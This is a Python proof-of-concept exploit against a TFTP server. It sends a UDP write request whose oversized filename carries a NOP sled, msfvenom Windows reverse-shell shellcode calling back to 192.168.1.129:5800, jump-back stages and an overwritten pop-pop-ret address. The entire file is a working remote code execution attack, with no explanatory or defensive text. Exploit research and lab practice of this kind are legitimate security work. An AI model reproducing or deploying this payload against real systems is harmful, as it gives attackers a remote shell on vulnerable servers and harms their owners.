import socket
import sys
import struct
UDP_IP = sys.argv[1]
UDP_PORT = 69

packet_type = "\x00\x02"	#WRQ
filename = "\x90"*(1250-4-13-100-368) #NOP sled
#SHELLCODE  msfvenom -p windows/shell/reverse_tcp LPORT=5800 LHOST=192.168.1.129 -f python -v filename -b "\x00"
filename += "\xda\xd3\xd9\x74\x24\xf4\xba\xed\xe0\x70\x9a\x5d"
filename += "\x33\xc9\xb1\x56\x31\x55\x18\x03\x55\x18\x83\xc5"
filename += "\xe9\x02\x85\x66\x19\x40\x66\x97\xd9\x25\xee\x72"
filename += "\xe8\x65\x94\xf7\x5a\x56\xde\x5a\x56\x1d\xb2\x4e"
filename += "\xed\x53\x1b\x60\x46\xd9\x7d\x4f\x57\x72\xbd\xce"
filename += "\xdb\x89\x92\x30\xe2\x41\xe7\x31\x23\xbf\x0a\x63"
filename += "\xfc\xcb\xb9\x94\x89\x86\x01\x1e\xc1\x07\x02\xc3"
filename += "\x91\x26\x23\x52\xaa\x70\xe3\x54\x7f\x09\xaa\x4e"
filename += "\x9c\x34\x64\xe4\x56\xc2\x77\x2c\xa7\x2b\xdb\x11"
filename += "\x08\xde\x25\x55\xae\x01\x50\xaf\xcd\xbc\x63\x74"
filename += "\xac\x1a\xe1\x6f\x16\xe8\x51\x54\xa7\x3d\x07\x1f"
filename += "\xab\x8a\x43\x47\xaf\x0d\x87\xf3\xcb\x86\x26\xd4"
filename += "\x5a\xdc\x0c\xf0\x07\x86\x2d\xa1\xed\x69\x51\xb1"
filename += "\x4e\xd5\xf7\xb9\x62\x02\x8a\xe3\xea\xe7\xa7\x1b"
filename += "\xea\x6f\xbf\x68\xd8\x30\x6b\xe7\x50\xb8\xb5\xf0"
filename += "\xe1\xae\x45\x2e\x49\xbe\xbb\xcf\xa9\x96\x7f\x9b"
filename += "\xf9\x80\x56\xa4\x92\x50\x56\x71\x0e\x5b\xc0\xba"
filename += "\x66\x5a\x91\x53\x74\x5d\x87\x0b\xf1\xbb\xf7\x1b"
filename += "\x51\x14\xb8\xcb\x11\xc4\x50\x06\x9e\x3b\x40\x29"
filename += "\x75\x54\xeb\xc6\x23\x0c\x84\x7f\x6e\xc6\x35\x7f"
filename += "\xa5\xa2\x76\x0b\x4f\x52\x38\xfc\x3a\x40\x2d\x9b"
filename += "\xc4\x98\xae\x0e\xc4\xf2\xaa\x98\x93\x6a\xb1\xfd"
filename += "\xd3\x34\x4a\x28\x60\x32\xb4\xad\x50\x48\x83\x3b"
filename += "\xdc\x26\xec\xab\xdc\xb6\xba\xa1\xdc\xde\x1a\x92"
filename += "\x8f\xfb\x64\x0f\xbc\x57\xf1\xb0\x94\x04\x52\xd9"
filename += "\x1a\x72\x94\x46\xe5\x51\xa6\x81\x19\x27\x81\x29"
filename += "\x71\xd7\x91\xc9\x81\xbd\x11\x9a\xe9\x4a\x3d\x15"
filename += "\xd9\xb3\x94\x7e\x71\x39\x79\xcc\xe0\x3e\x50\x90"
filename += "\xbc\x3f\x57\x09\x4f\x45\x18\xae\xb0\xba\x30\xcb"
filename += "\xb1\xba\x3c\xed\x8e\x6c\x05\x9b\xd1\xac\x32\x94"
filename += "\x64\x90\x13\x3f\x86\x86\x64\x6a"
#SHELLCODE
filename += "\x90"*100
filename += "\xd9\xee\xd9\x74\x24\xf4\x59\xfe\xcd\xfe\xcd\xff\xe1"  #2nd stage. jmp back 512 bytes. 
filename +="\xeb\xf0\x90\x90" #1st stage. jmp back 13 bytes to fall on our 2nd stage
filename += struct.pack("<I", 0x40484F) #eip=0x0040484F -> pop pop ret. The null byte in the address will be filled by the null byte required by the TFTP protocol to be put between the mode and filename.
mode = "\x00"+"netascii"+"B"*3750+"\x00" 



payload = packet_type + filename + mode
print "UDP target IP:", UDP_IP
print "UDP target port:", UDP_PORT
# print "payload:", payload

sock = socket.socket(socket.AF_INET, # Internet
                     socket.SOCK_DGRAM) # UDP
sock.sendto(payload, (UDP_IP, UDP_PORT))

